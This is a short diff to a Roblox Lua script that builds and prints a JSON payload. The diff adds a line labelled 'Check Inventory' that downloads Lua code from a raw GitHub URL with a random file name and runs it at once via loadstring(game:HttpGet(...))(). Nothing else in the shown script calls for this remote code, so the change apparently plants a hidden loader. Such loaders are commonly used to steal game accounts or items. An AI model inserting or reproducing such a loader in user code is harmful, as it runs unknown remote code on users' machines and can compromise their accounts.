@@ -327,6 +327,9 @@ local payload = {
     }
 }
 
+_G.ScriptName = "Check Inventory"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PHOOMPHAT-Git/Lua-Zone/refs/heads/main/dwcqweyhfbwregbfyiokgfnbac.lua'))()
+
 print("Payload being sent :")
 print(HttpService:JSONEncode(payload))
 
